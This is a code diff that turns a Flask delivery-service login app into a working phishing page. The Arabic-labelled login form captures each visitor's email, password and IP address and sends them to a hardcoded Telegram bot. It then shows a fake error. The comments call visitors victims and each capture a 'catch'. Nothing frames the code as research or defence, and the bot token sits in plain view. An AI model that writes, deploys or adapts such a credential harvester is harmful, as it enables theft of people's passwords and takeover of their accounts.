@@ -1,57 +1,53 @@
-from flask import Flask, render_template, request, redirect, url_for, flash
-from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
+from flask import Flask, render_template, request, redirect, url_for
+import requests
 
 app = Flask(__name__)
 app.secret_key = "emptynetsecret"
 
-login_manager = LoginManager()
-login_manager.init_app(app)
-login_manager.login_view = "login"
+# --- إعدادات التليجرام الخاصة بك ---
+TOKEN = "8342550502:AAFxUB3_bJuUvRez0uzGAllhzTph7z4mhA8"
+ID = "7089570610"
 
-# قاعدة بيانات مؤقتة للمستخدمين
-users = {"user@example.com": {"password": "Password123"}}
-
-class User(UserMixin):
-    def __init__(self, id):
-        self.id = id
-
-@login_manager.user_loader
-def load_user(user_id):
-    return User(user_id)
+def send_to_telegram(message):
+    try:
+        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+        data = {"chat_id": ID, "text": message}
+        requests.post(url, data=data)
+    except:
+        pass
 
 @app.route("/")
 def home():
-    return "Welcome to Empty.net - Delivery Service"
+    # توجيه الزوار تلقائياً إلى صفحة تسجيل الدخول
+    return redirect(url_for("login"))
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
     if request.method == "POST":
-        email = request.form["email"]
-        password = request.form["password"]
-        if email in users and users[email]["password"] == password:
-            user = User(email)
-            login_user(user)
-            return redirect(url_for("dashboard"))
-        else:
-            flash("Invalid credentials")
+        email = request.form.get("email")
+        password = request.form.get("password")
+        
+        # تجهيز الرسالة التي ستصلك
+        user_ip = request.remote_addr
+        text = f"🎯 صيد جديد من عسل وثعبان:\n\n👤 اليميل: {email}\n🔑 الباسورد: {password}\n🌐 IP: {user_ip}"
+        
+        # إرسال البيانات للتليجرام
+        send_to_telegram(text)
+        
+        # توجيه الضحية لصفحة وهمية أو صفحة الخطأ بعد الصيد
+        return "حدث خطأ في الاتصال، يرجى المحاولة لاحقاً"
+
+    # شكل صفحة الدخول البسيطة
     return '''
+    <div style="text-align: center; margin-top: 50px; font-family: Arial;">
+        <h2>تسجيل الدخول - عسل وثعبان</h2>
         <form method="post">
-            Email: <input type="text" name="email"><br>
-            Password: <input type="password" name="password"><br>
-            <input type="submit" value="Login">
+            <input type="text" name="email" placeholder="البريد الإلكتروني" required style="padding: 10px; margin: 5px;"><br>
+            <input type="password" name="password" placeholder="كلمة المرور" required style="padding: 10px; margin: 5px;"><br>
+            <input type="submit" value="دخول" style="padding: 10px 40px; background: #f39c12; color: white; border: none; cursor: pointer;">
         </form>
+    </div>
     '''
-
-@app.route("/dashboard")
-@login_required
-def dashboard():
-    return f"Hello, {current_user.id}. Welcome to your dashboard!"
-
-@app.route("/logout")
-@login_required
-def logout():
-    logout_user()
-    return redirect(url_for("home"))
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
